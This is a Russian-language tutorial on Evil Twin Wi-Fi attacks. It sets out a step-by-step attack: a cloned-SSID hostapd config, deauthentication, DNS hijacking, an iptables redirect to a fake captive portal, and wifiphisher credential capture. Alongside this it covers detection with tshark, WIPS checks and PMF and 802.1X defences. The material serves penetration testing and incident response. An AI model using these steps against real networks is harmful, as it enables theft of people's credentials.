## Вопрос, с которого всё начинается

Сотрудник заходит в кафе, видит знакомый SSID `Corp-Guest` и подключается — а вечером выясняется, что пароль от корпоративной почты утёк. Точка была настоящей? Нет: её поднял атакующий. Как выглядит такая атака и, главное, как её распознать?

## Что такое Evil Twin

**Evil Twin** («злой двойник») — это поддельная точка доступа, которая выдаёт себя за легитимную: тот же SSID, часто тот же тип защиты, иногда даже похожий BSSID. Клиент видит две сети с одинаковым именем и подключается к той, чей сигнал **громче**. Атакующий, стоя рядом, глушит настоящую точку или просто перекрывает её мощностью.

Ключевое: SSID в 802.11 не уникален. Имя сети — это не идентификатор, а просто строка в beacon. Идентификатор — **BSSID** (MAC-адрес точки). Клиент различает сети по BSSID, но при одинаковом SSID предпочитает сильнейший сигнал, а не «правильный» адрес.

## Шаг 1: как поднять двойника

Всё делается одной картой, умеющей AP-режим. Простейший путь — `hostapd` с конфигом, где SSID скопирован у цели, а защита — открытая:

```
$ cat hostapd-evil.conf
interface=wlan0
ssid=Corp-Guest
hw_mode=g
channel=6
auth_algs=1
```

```
$ hostapd hostapd-evil.conf
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED
```

Точка поднялась. Теперь клиенты, ищущие `Corp-Guest`, увидят её. Если настоящая точка тоже в эфире — атакующий добавляет деаутентификацию, чтобы клиенты «перетекли» на двойника.

## Шаг 2: captive portal — где начинается кража

Открытая точка без интернета выглядит подозрительно: браузер ругается. Поэтому двойника оборачивают в **captive portal** — страницу «войдите в сеть». Технически это перехват: любой HTTP-запрос клиента перенаправляется на наш веб-сервер, который отдаёт **клон** страницы авторизации.

```
$ iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to 10.0.0.1:80
```

Клон может быть копией корпоративного портала SSO. Пользователь вводит логин и пароль — они уходят нам. Никакой магии: атака целиком на **человеке**, а не на криптографии.

## Шаг 3: что видно в дампе rogue-точки

Разберём инцидент: в дампе две точки с SSID `Corp-Guest`. Найдём их BSSID и уровень сигнала:

```
$ tshark -r incident.pcap -Y 'wlan.ssid == "Corp-Guest" && wlan.fc.type_subtype == 8' \
    -T fields -e wlan.bssid -e radiotap.dbm_antsignal | sort | uniq -c
     412  aa:bb:cc:00:11:22   -55
      88  66:77:88:99:aa:bb   -38
```

Второй BSSID (`66:77:88:99:aa:bb`) громче (`-38 dBm`) и появился позже — это двойник. Настоящая точка имеет `-55`. Признак: **неизвестный BSSID с тем же SSID и более сильным сигналом**.

## Шаг 4: как отличить двойника по кадрам

Кроме сигнала есть устойчивые отличия. У настоящей корпоративной точки обычно включён **PMF** (Protected Management Frames), у двойника — нет; набор поддерживаемых скоростей и возможностей (RSN IE) тоже отличается.

```
$ tshark -r incident.pcap -Y 'wlan.bssid == 66:77:88:99:aa:bb && wlan.fc.type_subtype == 8' \
    -T fields -e wlan.rsn.capabilities.mfpr -e wlan.supported_rates
```

Пустое `mfpr` — PMF выключен. Если настоящая точка требует PMF, клиент с поддержкой PMF не подключится к двойнику — именно поэтому PMF обязателен в WPA3. Это и есть главная защита от Evil Twin на уровне протокола.

## Шаг 5: защита и как её обходят

Полный набор контрмер:

- **PMF (802.11w)** — защищает management-кадры подписью; deauth и поддельные beacon отсекаются.
- **802.1X / WPA-Enterprise** — клиент проверяет сертификат RADIUS, самозванец без валидного сертификата не пройдёт.
- **HTTPS + HSTS** — даже с captive-portal клон не получит данные, если клиент проверяет сертификат сайта.
- **Корпоративные профили** с явным списком SSID и запретом автоподключения к «открытым» одноимённым сетям.

Обход PMF возможен через **downgrade**: атакующий поднимает точку без PMF и надеется, что клиент согласится. Поэтому производители в WPA3 сделали PMF обязательным.

## Частые грабли

- **Один адаптер не может и AP, и monitor одновременно** → нужен второй адаптер для слежки.
- **Канал двойника должен совпадать** с каналом цели, иначе клиент не увидит «свою» сеть.
- **Клон портала без HTTPS** → современный браузер покажет предупреждение; фишинг всё равно работает, но конверсия ниже.
- **Забыли про DNS** → клиент получит ошибку вместо портала; нужен DNS-хайджек.
- **PMF на цели** → двойник без PMF может быть отвергнут клиентом.

## Полный прогон от эфира до пароля

1. `airodump-ng` — находим цель, канал и BSSID.
2. `hostapd` с тем же SSID — поднимаем двойника на том же канале.
3. `aireplay-ng --deauth` — сгоняем клиентов с настоящей точки.
4. DNS-хайджек + веб-сервер с клоном — отдаём captive portal.
5. Пользователь вводит логин/пароль → они попадают в наш лог.

В отчёте фиксируют: SSID, BSSID двойника, время, украденные учётные данные (обезличенно) и рекомендацию включить PMF.

## Что мы теперь знаем

- Evil Twin — поддельная точка с тем же SSID; клиент выбирает по сигналу.
- SSID не уникален, уникален BSSID — отсюда путаница.
- Captive portal + клон страницы — точка кражи данных.
- Признаки двойника: новый BSSID, сильнее сигнал, PMF выключен.
- Защита: PMF, 802.1X с сертификатом, HTTPS/HSTS.

## Шаг 6: автоматизация — airgeddon и wifiphisher

Поднимать двойника вручную (`hostapd` + DNS + веб-сервер) утомительно, поэтому есть готовые фреймворки. **airgeddon** — набор bash-скриптов, который сам сканирует эфир, строит меню и поднимает Evil Twin с шаблонами порталов. **wifiphisher** — инструмент на Python, специализирующийся именно на фишинге: он умеет подменять страницы известных сервисов и собирать введённые данные.

```
$ wifiphisher -e Corp-Guest -p firmware-upgrade
[*] Creating the rogue AP...
[*] Starting the phishing page...
[+] Credentials captured: j.smith / Winter2024
```

Меню `-p firmware-upgrade` выбирает шаблон страницы «обновите прошивку роутера» — один из самых конверсионных сценариев. Важно: инструмент лишь автоматизирует то, что мы разобрали руками; понимание шагов критично, потому что на реальном объекте шаблон всегда адаптируют под бренд заказчика.

## Шаг 7: обнаружение rogue-точки защитником

Защита начинается с инвентаризации: **WIPS/WIDS** непрерывно сканирует эфир и сверяет каждый BSSID со списком разрешённых. Всё, чего нет в белом списке, — rogue. Типичные сигнатуры:

- beacon с SSID, которому не соответствует ни один санкционированный BSSID;
- BSSID, чей вендорный префикс (OUI) не совпадает с корпоративным парком;
- точка, которая появилась в эфире внезапно и держится недолго;
- клиенты, которые «прыгают» между двумя точками с одинаковым SSID.

```
$ tshark -r corp-scan.pcap -Y 'wlan.fc.type_subtype == 8' \\
    -T fields -e wlan.bssid -e wlan.ssid | sort -u
aa:bb:cc:00:11:22   Corp-Guest
66:77:88:99:aa:bb   Corp-Guest   # нет в инвентаре
```

Второй BSSID отсутствует в реестре — его изолируют и расследуют. Именно так выглядит практическая работа SOC с беспроводными инцидентами.

## Шаг 8: правовые и этические рамки

Evil Twin — атака, которая **направлена на людей** и собирает их учётные данные. Это требует явного письменного разрешения в договоре (scope + правила обработки персональных данных). Настоящий фишинг сотрудников без согласия — уже не пентест, а преступление. В отчёте данные обезличивают: показывают факт «пользователь ввёл учётные данные», но не хранят сам пароль дольше, чем нужно для доказательства.

## Что делать защитнику

- Включить **PMF** на всех точках (в WPA3 он обязателен).
- Использовать **WPA-Enterprise с проверкой сертификата RADIUS** — тогда двойник не пройдёт.
- Вести **инвентарь BSSID** и настроить WIPS.
- Обучать сотрудников: не подключаться к одноимённым открытым сетям.
- Запретить автоподключение к открытым SSID на корпоративных устройствах (MDM-профиль).

## Разбор реального кейса: «сеть в кафе»

Проследим типичный инцидент. В логах SOC: пользователь `j.smith` подключался к `Corp-Guest` из кафе. Через час его доменная учётная запись использовалась для входа в VPN из другой страны. Что произошло?

```
$ tshark -r cafe.pcap -Y 'wlan.ssid == "Corp-Guest"' \\
    -T fields -e wlan.bssid -e radiotap.dbm_antsignal | sort | uniq -c
     88  aa:bb:cc:00:11:22   -72
    412  66:77:88:99:aa:bb   -34
```

Двойник (`66:77:88:99:aa:bb`) мощнее и с большим числом beacon — он «перекричал» настоящую точку. В дампе виден перехваченный HTTP-POST на поддельный портал:

```
$ tshark -r cafe.pcap -Y 'http.request.method == "POST"' \\
    -T fields -e http.host -e http.file_data | head -1
portal.corp-guest.net  user=j.smith&pass=Winter2024
```

Данные ушли в открытом виде, потому что клон портала был HTTP, а не HTTPS. Это и есть полный цикл атаки: двойник → портал → кража.

## Типовые сценарии применения

Evil Twin используют не только в кафе:

- **Конференции и отели** — люди массово ищут знакомые SSID, конверсия высокая.
- **Аэропорты** — много «транзитных» пользователей, никто не проверяет сеть.
- **Рядом с офисом** — двойник корпоративного SSID ловит сотрудников с ноутбуками.
- **Физический пентест** — двойник как часть сценария «красной команды».

В каждом случае схема одна: воспроизвести знакомое имя сети и заставить клиента выбрать её.

## Как выглядит успешная защита

Проверим, что контрмеры работают. Если на точке включён PMF, а у клиента профиль проверяет сертификат:

```
$ tshark -r secure.pcap -Y 'wlan.fc.type_subtype == 8 && wlan.ssid == "Corp-Guest"' \\
    -T fields -e wlan.bssid -e wlan.rsn.capabilities.mfpr
aa:bb:cc:00:11:22   required
```

Единственный BSSID, `mfpr = required` — поддельные management-кадры не пройдут. Двойник без PMF будет отвергнут клиентом, а попытка деаутентификации проигнорирована. Это и есть цель защитной конфигурации.

## Что запомнить

- Инцидент всегда оставляет след: аномальный BSSID, громкий сигнал, HTTP-POST с паролем.
- Атака работает там, где люди ищут знакомые SSID.
- PMF + проверка сертификата + HTTPS — базовый набор защиты.
- В отчёте важно показать цепочку «двойник → портал → утечка», а не только факт точки.

## Куда дальше

Мы научились поднимать двойника и распознавать его. Дальше — WPA-Enterprise: там двойник поднимают не для портала, а чтобы выманить хэш MSCHAPv2. А пока главное запомни: Evil Twin ломает доверие к имени сети, а лечится это подписью кадров и проверкой сертификата.

## Где пригодится

- Пентест беспроводных сетей и симуляции фишинга.
- Разбор инцидентов: поиск rogue-AP в корпоративном эфире.
- CTF: дампы с подозрительным BSSID.
